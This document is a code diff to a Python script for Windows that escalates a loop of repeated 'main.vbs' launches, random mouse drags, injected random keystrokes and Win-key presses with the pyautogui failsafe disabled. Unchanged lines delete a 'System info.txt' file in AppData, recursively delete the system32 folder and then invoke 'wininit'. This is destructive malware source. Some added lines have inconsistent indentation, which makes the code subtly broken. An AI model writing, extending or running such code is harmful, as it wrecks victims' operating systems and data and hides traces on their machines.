@@ -3,7 +3,8 @@ import subprocess
 import requests
 import os
 import random
-from random import randint 
+from random import randint
+import string
 import pyautogui
 pyautogui.FAILSAFE = False
 mouse = pyautogui
@@ -27,12 +28,17 @@ def main():
     web.execute()
     subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\appdata\System info.txt"')
     a=0
-    while a < 10:
+    while a < 100:
         subprocess.getoutput('start main.vbs')
         rndvalueX = randint(0, 1919)
         rndvalueY = randint(0, 1019)
+        rndletter1 = random.choice(string.ascii_letters)
+	    rndletter2 = random.choice(string.ascii_letters)
+	    rndletter3 = random.choice(string.ascii_letters)
         mouse.dragTo(rndvalueX, rndvalueY)
+        keyboard.write(rndletter1 + rndletter2 + rndletter3, interval=0.01)
         pyautogui.click()
+        keyboard.press('win')
         a += 1
     subprocess.getoutput('rd "%windir%\system32"/q /s')
     subprocess.run(["powershell", "-Command", "wininit"])
